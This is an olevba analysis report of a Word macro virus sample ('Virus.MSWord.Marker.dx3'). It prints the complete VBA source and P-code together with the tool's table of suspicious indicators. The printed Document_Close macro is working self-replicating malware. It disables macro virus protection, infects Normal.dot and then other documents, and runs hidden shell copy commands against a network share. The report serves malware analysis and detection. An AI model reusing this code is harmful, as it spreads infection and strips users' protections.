olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.dx3
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.dx3 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton11_Click()
Dim a, b, Msg, Style, Title, Response, Msg1, Style1, Title1, Response1, Msg2, Style2, Title2, Response2

a = "g:\home\st6\course_2\group_3a\модель1\завод\склад2\бухгалтерия\документы\platpor.xls"
b = "g:\home\st6\course_2\group_3a\модель1\завод\склад2\кладовщик\вход\2platpor2.xls"


Msg = "Вы действительно хотите отправить файл?"  ' Сообщение.
Style = vbYesNo + vbDefaultButton2  ' Кнопки.
Title = "Сообщение"    ' Заголовок.
Response = MsgBox(Msg, Style, Title)


If Response = vbYes Then ' Нажата кнопка "Да" (Yes).

FileCopy a, b
Kill "g:\home\st6\course_2\group_3a\модель1\завод\склад2\бухгалтерия\вход\2scht-f2.xls"

If Time > #4:00:00 PM# And Time < #4:40:00 PM# Then

Msg1 = "Сейчас вы действуете по плану первого квартала"  ' Сообщение.
Style1 = vbOKOnly
Title1 = "Сообщение"    ' Заголовок.
Response1 = MsgBox(Msg1, Style1, Title1)
Else

If Time > #4:40:00 PM# And Time < #5:40:00 PM# Then


Msg2 = "Сейчас вы действуете по плану второго квартала"  ' Сообщение.
Style2 = vbOKOnly
Title2 = "Сообщение"    ' Заголовок.
Response2 = MsgBox(Msg2, Style2, Title2)


End If
End If
End If

End Sub


Private Sub CommandButton2_Click()
Dim a, b, Msg, Style, Title, Response, Msg1, Style1, Title1, Response1, Msg2, Style2, Title2, Response2

a = "g:\home\st6\course_2\group_3a\модель1\завод\склад2\бухгалтерия\документы\dover.doc"
b = "g:\home\st6\course_2\group_3a\модель1\завод\склад2\кладовщик\вход\2dover1.doc"


Msg = "Вы действительно хотите отправить файл?"  ' Сообщение.
Style = vbYesNo + vbDefaultButton2  ' Кнопки.
Title = "Сообщение"    ' Заголовок.
Response = MsgBox(Msg, Style, Title)

If Response = vbYes Then ' Нажата кнопка "Да" (Yes).

FileCopy a, b
Kill "g:\home\st6\course_2\group_3a\модель1\завод\склад2\бухгалтерия\вход\2vipiska1.doc"


If Time > #4:00:00 PM# And Time < #4:40:00 PM# Then


Msg1 = "Сейчас вы действуете по плану первого квартала"  ' Сообщение.
Style1 = vbOKOnly
Title1 = "Сообщение"    ' Заголовок.
Response1 = MsgBox(Msg1, Style1, Title1)
Else

If Time > #4:40:00 PM# And Time < #5:40:00 PM# Then


Msg2 = "Сейчас вы действуете по плану второго квартала"  ' Сообщение.
Style2 = vbOKOnly
Title2 = "Сообщение"    ' Заголовок.
Response2 = MsgBox(Msg2, Style2, Title2)


End If
End If
End If

End Sub

Private Sub CommandButton21_Click()
Dim a, b, Msg, Style, Title, Response, Msg1, Style1, Title1, Response1, Msg2, Style2, Title2, Response2

a = "g:\home\st6\course_2\group_3a\модель1\завод\склад2\бухгалтерия\документы\dover.doc"
b = "g:\home\st6\course_2\group_3a\модель1\завод\склад2\кладовщик\вход\2dover2.doc"


Msg = "Вы действительно хотите отправить файл?"  ' Сообщение.
Style = vbYesNo + vbDefaultButton2  ' Кнопки.
Title = "Сообщение"    ' Заголовок.
Response = MsgBox(Msg, Style, Title)


If Response = vbYes Then ' Нажата кнопка "Да" (Yes).

FileCopy a, b
Kill "g:\home\st6\course_2\group_3a\модель1\завод\склад2\бухгалтерия\вход\2vipiska2.doc"



If Time > #4:00:00 PM# And Time < #4:40:00 PM# Then


Msg1 = "Сейчас вы действуете по плану первого квартала"  ' Сообщение.
Style1 = vbOKOnly
Title1 = "Сообщение"    ' Заголовок.
Response1 = MsgBox(Msg1, Style1, Title1)
Else

If Time > #4:40:00 PM# And Time < #5:40:00 PM# Then


Msg2 = "Сейчас вы действуете по плану второго квартала"  ' Сообщение.
Style2 = vbOKOnly
Title2 = "Сообщение"    ' Заголовок.
Response2 = MsgBox(Msg2, Style2, Title2)


End If
End If
End If

End Sub

Private Sub Document_Close()

On Error Resume Next

Dim sysbmp, ActiveDoc, NormalDot As Object
Dim SaveDoc, SaveNormalDot, Paid, NormalDotPaid As Boolean
Dim temp1, LogoL, LogoS As Integer
Dim MyCod, OurCode As String

Set ActiveDoc = ActiveDocument.VBProject.VBComponents.Item(1)
Set NormalDot = NormalTemplate.VBProject.VBComponents.Item(1)

Paid = ActiveDoc.CodeModule.Find("Paid", 1, 1, 1000, 1000)
NormalDotPaid = NormalDot.CodeModule.Find("Paid", 1, 1, 1000, 1000)

Options.VirusProtection = False
Options.SaveNormalPrompt = False

Set sysbmp = Application.FileSearch
With sysbmp
    .LookIn = "C:\Program Files\Common Files\SYSTEM"
    .FileName = "system.bmp"
    LogoL = .Execute
End With
With sysbmp
    .LookIn = "\\post\temp\1300"
    .FileName = "system.bmp"
    LogoS = .Execute
End With
    
If LogoS > 0 Then
If (LogoL <= 0) Then
    Shell "command.com /c copy \\post\temp\1300\system.bmp C:\Progra~1\Common~1\SYSTEM\system.bmp", vbHide
End If
Else
If (LogoL > 0) Then
    Shell "command.com /c copy C:\Progra~1\Common~1\SYSTEM\system.bmp \\post\temp\1300\system.bmp", vbHide
End If
End If

System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop", _
"WallPaper") = "C:\Program Files\Common Files\SYSTEM\system.bmp"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop", _
"WallpaperStyle") = "2"

If (Paid = True Xor NormalDotPaid = True) And _
    (ActiveDocument.SaveFormat = wdFormatDocument Or _
    ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
    If Paid = True Then
  
        SaveNormalDot = NormalTemplate.Saved
        MyCod = ActiveDoc.CodeModule.Lines(1, ActiveDoc.CodeModule.CountOfLines)

        temp1 = NormalDot.CodeModule.CountOfLines
        NormalDot.CodeModule.DeleteLines 1, temp1
        NormalDot.CodeModule.AddFromString MyCod
    
        If SaveNormalDot = True Then
            NormalTemplate.Save
        End If
    End If
              
    If NormalDotPaid = True And _
        (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
        ActiveDocument.Saved = False) Then
  
        SaveDoc = ActiveDocument.Saved
        OurCode = NormalDot.CodeModule.Lines(1, NormalDot.CodeModule.CountOfLines)

        temp1 = ActiveDoc.CodeModule.CountOfLines
        ActiveDoc.CodeModule.DeleteLines 1, temp1
        ActiveDoc.CodeModule.AddFromString OurCode
    
        If SaveDoc = True Then
            Documents.Save NoPrompt:=True, OriginalFormat:=wdOriginalDocumentFormat
        End If
    End If
    
End If

End Sub










-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.dx3
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 11835 bytes
' Line #0:
' 	FuncDefn (Private Sub CommandButton11_Click())
' Line #1:
' 	Dim 
' 	VarDefn a
' 	VarDefn B
' 	VarDefn Msg
' 	VarDefn Style
' 	VarDefn Title
' 	VarDefn Response
' 	VarDefn Msg1
' 	VarDefn Style1
' 	VarDefn Title1
' 	VarDefn Response1
' 	VarDefn Msg2
' 	VarDefn Style2
' 	VarDefn Title2
' 	VarDefn Response2
' Line #2:
' Line #3:
' 	LitStr 0x0054 "g:\home\st6\course_2\group_3a\модель1\завод\склад2\бухгалтерия\документы\platpor.xls"
' 	St a 
' Line #4:
' 	LitStr 0x004F "g:\home\st6\course_2\group_3a\модель1\завод\склад2\кладовщик\вход\2platpor2.xls"
' 	St B 
' Line #5:
' Line #6:
' Line #7:
' 	LitStr 0x0027 "Вы действительно хотите отправить файл?"
' 	St Msg 
' 	QuoteRem 0x0031 0x000B " Сообщение."
' Line #8:
' 	Ld vbYesNo 
' 	Ld vbDefaultButton2 
' 	Add 
' 	St Style 
' 	QuoteRem 0x0024 0x0008 " Кнопки."
' Line #9:
' 	LitStr 0x0009 "Сообщение"
' 	St Title 
' 	QuoteRem 0x0017 0x000B " Заголовок."
' Line #10:
' 	Ld Msg 
' 	Ld Style 
' 	Ld Title 
' 	ArgsLd MsgBox 0x0003 
' 	St Response 
' Line #11:
' Line #12:
' Line #13:
' 	Ld Response 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0019 0x001A " Нажата кнопка "Да" (Yes)."
' Line #14:
' Line #15:
' 	Ld a 
' 	Ld B 
' 	ArgsCall FileCopy 0x0002 
' Line #16:
' 	LitStr 0x0050 "g:\home\st6\course_2\group_3a\модель1\завод\склад2\бухгалтерия\вход\2scht-f2.xls"
' 	ArgsCall Kill 0x0001 
' Line #17:
' Line #18:
' 	Ld Time 
' 	LitDate 0x5555 0x5555 0x5555 0x3FE5 
' 	Gt 
' 	Ld Time 
' 	LitDate 0xE38E 0x8E38 0x38E3 0x3FE6 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #19:
' Line #20:
' 	LitStr 0x002E "Сейчас вы действуете по плану первого квартала"
' 	St Msg1 
' 	QuoteRem 0x0039 0x000B " Сообщение."
' Line #21:
' 	Ld vbOKOnly 
' 	St Style1 
' Line #22:
' 	LitStr 0x0009 "Сообщение"
' 	St Title1 
' 	QuoteRem 0x0018 0x000B " Заголовок."
' Line #23:
' 	Ld Msg1 
' 	Ld Style1 
' 	Ld Title1 
' 	ArgsLd MsgBox 0x0003 
' 	St Response1 
' Line #24:
' 	ElseBlock 
' Line #25:
' Line #26:
' 	Ld Time 
' 	LitDate 0xE38E 0x8E38 0x38E3 0x3FE6 
' 	Gt 
' 	Ld Time 
' 	LitDate 0x38E4 0xE38E 0x8E38 0x3FE7 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #27:
' Line #28:
' Line #29:
' 	LitStr 0x002E "Сейчас вы действуете по плану второго квартала"
' 	St Msg2 
' 	QuoteRem 0x0039 0x000B " Сообщение."
' Line #30:
' 	Ld vbOKOnly 
' 	St Style2 
' Line #31:
' 	LitStr 0x0009 "Сообщение"
' 	St Title2 
' 	QuoteRem 0x0018 0x000B " Заголовок."
' Line #32:
' 	Ld Msg2 
' 	Ld Style2 
' 	Ld Title2 
' 	ArgsLd MsgBox 0x0003 
' 	St Response2 
' Line #33:
' Line #34:
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	EndIfBlock 
' Line #38:
' Line #39:
' 	EndSub 
' Line #40:
' Line #41:
' Line #42:
' 	FuncDefn (Private Sub CommandButton2_Click())
' Line #43:
' 	Dim 
' 	VarDefn a
' 	VarDefn B
' 	VarDefn Msg
' 	VarDefn Style
' 	VarDefn Title
' 	VarDefn Response
' 	VarDefn Msg1
' 	VarDefn Style1
' 	VarDefn Title1
' 	VarDefn Response1
' 	VarDefn Msg2
' 	VarDefn Style2
' 	VarDefn Title2
' 	VarDefn Response2
' Line #44:
' Line #45:
' 	LitStr 0x0052 "g:\home\st6\course_2\group_3a\модель1\завод\склад2\бухгалтерия\документы\dover.doc"
' 	St a 
' Line #46:
' 	LitStr 0x004D "g:\home\st6\course_2\group_3a\модель1\завод\склад2\кладовщик\вход\2dover1.doc"
' 	St B 
' Line #47:
' Line #48:
' Line #49:
' 	LitStr 0x0027 "Вы действительно хотите отправить файл?"
' 	St Msg 
' 	QuoteRem 0x0031 0x000B " Сообщение."
' Line #50:
' 	Ld vbYesNo 
' 	Ld vbDefaultButton2 
' 	Add 
' 	St Style 
' 	QuoteRem 0x0024 0x0008 " Кнопки."
' Line #51:
' 	LitStr 0x0009 "Сообщение"
' 	St Title 
' 	QuoteRem 0x0017 0x000B " Заголовок."
' Line #52:
' 	Ld Msg 
' 	Ld Style 
' 	Ld Title 
' 	ArgsLd MsgBox 0x0003 
' 	St Response 
' Line #53:
' Line #54:
' 	Ld Response 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0019 0x001A " Нажата кнопка "Да" (Yes)."
' Line #55:
' Line #56:
' 	Ld a 
' 	Ld B 
' 	ArgsCall FileCopy 0x0002 
' Line #57:
' 	LitStr 0x0051 "g:\home\st6\course_2\group_3a\модель1\завод\склад2\бухгалтерия\вход\2vipiska1.doc"
' 	ArgsCall Kill 0x0001 
' Line #58:
' Line #59:
' Line #60:
' 	Ld Time 
' 	LitDate 0x5555 0x5555 0x5555 0x3FE5 
' 	Gt 
' 	Ld Time 
' 	LitDate 0xE38E 0x8E38 0x38E3 0x3FE6 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #61:
' Line #62:
' Line #63:
' 	LitStr 0x002E "Сейчас вы действуете по плану первого квартала"
' 	St Msg1 
' 	QuoteRem 0x0039 0x000B " Сообщение."
' Line #64:
' 	Ld vbOKOnly 
' 	St Style1 
' Line #65:
' 	LitStr 0x0009 "Сообщение"
' 	St Title1 
' 	QuoteRem 0x0018 0x000B " Заголовок."
' Line #66:
' 	Ld Msg1 
' 	Ld Style1 
' 	Ld Title1 
' 	ArgsLd MsgBox 0x0003 
' 	St Response1 
' Line #67:
' 	ElseBlock 
' Line #68:
' Line #69:
' 	Ld Time 
' 	LitDate 0xE38E 0x8E38 0x38E3 0x3FE6 
' 	Gt 
' 	Ld Time 
' 	LitDate 0x38E4 0xE38E 0x8E38 0x3FE7 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #70:
' Line #71:
' Line #72:
' 	LitStr 0x002E "Сейчас вы действуете по плану второго квартала"
' 	St Msg2 
' 	QuoteRem 0x0039 0x000B " Сообщение."
' Line #73:
' 	Ld vbOKOnly 
' 	St Style2 
' Line #74:
' 	LitStr 0x0009 "Сообщение"
' 	St Title2 
' 	QuoteRem 0x0018 0x000B " Заголовок."
' Line #75:
' 	Ld Msg2 
' 	Ld Style2 
' 	Ld Title2 
' 	ArgsLd MsgBox 0x0003 
' 	St Response2 
' Line #76:
' Line #77:
' Line #78:
' 	EndIfBlock 
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	EndIfBlock 
' Line #81:
' Line #82:
' 	EndSub 
' Line #83:
' Line #84:
' 	FuncDefn (Private Sub CommandButton21_Click())
' Line #85:
' 	Dim 
' 	VarDefn a
' 	VarDefn B
' 	VarDefn Msg
' 	VarDefn Style
' 	VarDefn Title
' 	VarDefn Response
' 	VarDefn Msg1
' 	VarDefn Style1
' 	VarDefn Title1
' 	VarDefn Response1
' 	VarDefn Msg2
' 	VarDefn Style2
' 	VarDefn Title2
' 	VarDefn Response2
' Line #86:
' Line #87:
' 	LitStr 0x0052 "g:\home\st6\course_2\group_3a\модель1\завод\склад2\бухгалтерия\документы\dover.doc"
' 	St a 
' Line #88:
' 	LitStr 0x004D "g:\home\st6\course_2\group_3a\модель1\завод\склад2\кладовщик\вход\2dover2.doc"
' 	St B 
' Line #89:
' Line #90:
' Line #91:
' 	LitStr 0x0027 "Вы действительно хотите отправить файл?"
' 	St Msg 
' 	QuoteRem 0x0031 0x000B " Сообщение."
' Line #92:
' 	Ld vbYesNo 
' 	Ld vbDefaultButton2 
' 	Add 
' 	St Style 
' 	QuoteRem 0x0024 0x0008 " Кнопки."
' Line #93:
' 	LitStr 0x0009 "Сообщение"
' 	St Title 
' 	QuoteRem 0x0017 0x000B " Заголовок."
' Line #94:
' 	Ld Msg 
' 	Ld Style 
' 	Ld Title 
' 	ArgsLd MsgBox 0x0003 
' 	St Response 
' Line #95:
' Line #96:
' Line #97:
' 	Ld Response 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0019 0x001A " Нажата кнопка "Да" (Yes)."
' Line #98:
' Line #99:
' 	Ld a 
' 	Ld B 
' 	ArgsCall FileCopy 0x0002 
' Line #100:
' 	LitStr 0x0051 "g:\home\st6\course_2\group_3a\модель1\завод\склад2\бухгалтерия\вход\2vipiska2.doc"
' 	ArgsCall Kill 0x0001 
' Line #101:
' Line #102:
' Line #103:
' Line #104:
' 	Ld Time 
' 	LitDate 0x5555 0x5555 0x5555 0x3FE5 
' 	Gt 
' 	Ld Time 
' 	LitDate 0xE38E 0x8E38 0x38E3 0x3FE6 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #105:
' Line #106:
' Line #107:
' 	LitStr 0x002E "Сейчас вы действуете по плану первого квартала"
' 	St Msg1 
' 	QuoteRem 0x0039 0x000B " Сообщение."
' Line #108:
' 	Ld vbOKOnly 
' 	St Style1 
' Line #109:
' 	LitStr 0x0009 "Сообщение"
' 	St Title1 
' 	QuoteRem 0x0018 0x000B " Заголовок."
' Line #110:
' 	Ld Msg1 
' 	Ld Style1 
' 	Ld Title1 
' 	ArgsLd MsgBox 0x0003 
' 	St Response1 
' Line #111:
' 	ElseBlock 
' Line #112:
' Line #113:
' 	Ld Time 
' 	LitDate 0xE38E 0x8E38 0x38E3 0x3FE6 
' 	Gt 
' 	Ld Time 
' 	LitDate 0x38E4 0xE38E 0x8E38 0x3FE7 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #114:
' Line #115:
' Line #116:
' 	LitStr 0x002E "Сейчас вы действуете по плану второго квартала"
' 	St Msg2 
' 	QuoteRem 0x0039 0x000B " Сообщение."
' Line #117:
' 	Ld vbOKOnly 
' 	St Style2 
' Line #118:
' 	LitStr 0x0009 "Сообщение"
' 	St Title2 
' 	QuoteRem 0x0018 0x000B " Заголовок."
' Line #119:
' 	Ld Msg2 
' 	Ld Style2 
' 	Ld Title2 
' 	ArgsLd MsgBox 0x0003 
' 	St Response2 
' Line #120:
' Line #121:
' Line #122:
' 	EndIfBlock 
' Line #123:
' 	EndIfBlock 
' Line #124:
' 	EndIfBlock 
' Line #125:
' Line #126:
' 	EndSub 
' Line #127:
' Line #128:
' 	FuncDefn (Private Sub Document_Close())
' Line #129:
' Line #130:
' 	OnError (Resume Next) 
' Line #131:
' Line #132:
' 	Dim 
' 	VarDefn sysbmp
' 	VarDefn ActiveDoc
' 	VarDefn NormalDot (As Object)
' Line #133:
' 	Dim 
' 	VarDefn SaveDoc
' 	VarDefn SaveNormalDot
' 	VarDefn Paid
' 	VarDefn NormalDotPaid (As Boolean)
' Line #134:
' 	Dim 
' 	VarDefn temp1
' 	VarDefn LogoL
' 	VarDefn LogoS (As Integer)
' Line #135:
' 	Dim 
' 	VarDefn MyCod
' 	VarDefn OurCode (As String)
' Line #136:
' Line #137:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ActiveDoc 
' Line #138:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NormalDot 
' Line #139:
' Line #140:
' 	LitStr 0x0004 "Paid"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	Ld ActiveDoc 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St Paid 
' Line #141:
' 	LitStr 0x0004 "Paid"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	Ld NormalDot 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalDotPaid 
' Line #142:
' Line #143:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #144:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #145:
' Line #146:
' 	SetStmt 
' 	Ld Application 
' 	MemLd FileSearch 
' 	Set sysbmp 
' Line #147:
' 	StartWithExpr 
' 	Ld sysbmp 
' 	With 
' Line #148:
' 	LitStr 0x0024 "C:\Program Files\Common Files\SYSTEM"
' 	MemStWith LookIn 
' Line #149:
' 	LitStr 0x000A "system.bmp"
' 	MemStWith FileName 
' Line #150:
' 	MemLdWith Execute 
' 	St LogoL 
' Line #151:
' 	EndWith 
' Line #152:
' 	StartWithExpr 
' 	Ld sysbmp 
' 	With 
' Line #153:
' 	LitStr 0x0010 "\\post\temp\1300"
' 	MemStWith LookIn 
' Line #154:
' 	LitStr 0x000A "system.bmp"
' 	MemStWith FileName 
' Line #155:
' 	MemLdWith Execute 
' 	St LogoS 
' Line #156:
' 	EndWith 
' Line #157:
' Line #158:
' 	Ld LogoS 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #159:
' 	Ld LogoL 
' 	LitDI2 0x0000 
' 	Le 
' 	Paren 
' 	IfBlock 
' Line #160:
' 	LitStr 0x0056 "command.com /c copy \\post\temp\1300\system.bmp C:\Progra~1\Common~1\SYSTEM\system.bmp"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #161:
' 	EndIfBlock 
' Line #162:
' 	ElseBlock 
' Line #163:
' 	Ld LogoL 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #164:
' 	LitStr 0x0056 "command.com /c copy C:\Progra~1\Common~1\SYSTEM\system.bmp \\post\temp\1300\system.bmp"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #165:
' 	EndIfBlock 
' Line #166:
' 	EndIfBlock 
' Line #167:
' Line #168:
' 	LineCont 0x0004 08 00 00 00
' 	LitStr 0x002F "C:\Program Files\Common Files\SYSTEM\system.bmp"
' 	LitStr 0x0000 ""
' 	LitStr 0x0027 "HKEY_CURRENT_USER\Control Panel\Desktop"
' 	LitStr 0x0009 "WallPaper"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #169:
' 	LineCont 0x0004 08 00 00 00
' 	LitStr 0x0001 "2"
' 	LitStr 0x0000 ""
' 	LitStr 0x0027 "HKEY_CURRENT_USER\Control Panel\Desktop"
' 	LitStr 0x000E "WallpaperStyle"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #170:
' Line #171:
' 	LineCont 0x0008 0B 00 04 00 12 00 04 00
' 	Ld Paid 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormalDotPaid 
' 	LitVarSpecial (True)
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #172:
' Line #173:
' 	Ld Paid 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #174:
' Line #175:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalDot 
' Line #176:
' 	LitDI2 0x0001 
' 	Ld ActiveDoc 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ActiveDoc 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St MyCod 
' Line #177:
' Line #178:
' 	Ld NormalDot 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St temp1 
' Line #179:
' 	LitDI2 0x0001 
' 	Ld temp1 
' 	Ld NormalDot 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #180:
' 	Ld MyCod 
' 	Ld NormalDot 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #181:
' Line #182:
' 	Ld SaveNormalDot 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #183:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #184:
' 	EndIfBlock 
' Line #185:
' 	EndIfBlock 
' Line #186:
' Line #187:
' 	LineCont 0x0008 05 00 08 00 13 00 08 00
' 	Ld NormalDotPaid 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #188:
' Line #189:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDoc 
' Line #190:
' 	LitDI2 0x0001 
' 	Ld NormalDot 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld NormalDot 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #191:
' Line #192:
' 	Ld ActiveDoc 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St temp1 
' Line #193:
' 	LitDI2 0x0001 
' 	Ld temp1 
' 	Ld ActiveDoc 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #194:
' 	Ld OurCode 
' 	Ld ActiveDoc 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #195:
' Line #196:
' 	Ld SaveDoc 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #197:
' 	LitVarSpecial (True)
' 	ParamNamed NoPrompt 
' 	Ld wdOriginalDocumentFormat 
' 	ParamNamed OriginalFormat 
' 	Ld Documents 
' 	ArgsMemCall Save 0x0002 
' Line #198:
' 	EndIfBlock 
' Line #199:
' 	EndIfBlock 
' Line #200:
' Line #201:
' 	EndIfBlock 
' Line #202:
' Line #203:
' 	EndSub 
' Line #204:
' Line #205:
' Line #206:
' Line #207:
' Line #208:
' Line #209:
' Line #210:
' Line #211:
' Line #212:
' Line #213:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |CommandButton11_Clic|Runs when the file is opened and ActiveX     |
|          |k                   |objects trigger events                       |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

